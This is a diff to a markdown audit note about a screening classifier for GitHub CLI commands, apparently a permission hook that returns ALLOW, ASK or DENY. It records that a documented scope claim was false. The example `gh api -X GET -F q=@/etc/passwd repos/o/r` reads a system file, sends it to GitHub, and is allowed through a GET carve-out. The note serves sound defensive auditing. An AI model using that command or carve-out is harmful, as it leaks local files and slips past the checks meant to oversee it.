@@ -184,12 +184,13 @@ value's `github.com` contains a `t`. When a Go comment and the README
 describe one screen at different strictness, the comment is usually the
 measured one — probe, then bring the README up to it.
 
-**Round 6 shape: the false claim was the SCOPE JUSTIFICATION (#229, PR
-#232).** A new track (grading the local files a `gh` publish verb sends
-to GitHub) shipped with an accurate mechanism paragraph and one false
-sentence explaining what it deliberately left out: "every `gh api` form
-carrying a request body already asks for method reasons, so there is no
-allow to close". Probing refutes it — `gh api -X GET -F q=@/etc/passwd
+**Round 6 shape: the false claim was the SCOPE JUSTIFICATION
+(#229, PR #232).** A new track (grading the local files a `gh` publish
+verb sends to GitHub) shipped with an accurate mechanism paragraph and
+one false sentence explaining what it deliberately left out: "every
+`gh api` form carrying a request body already asks for method reasons,
+so there is no allow to close".
+Probing refutes it — `gh api -X GET -F q=@/etc/passwd
 repos/o/r` ALLOWs (classifyGhAPI's explicit-GET carve-out falls through
 to the REST allowlist), and the graphql `-F query=@file` form DENIES
 rather than asking. The same sentence also lumped `-f`/`-F` as doing
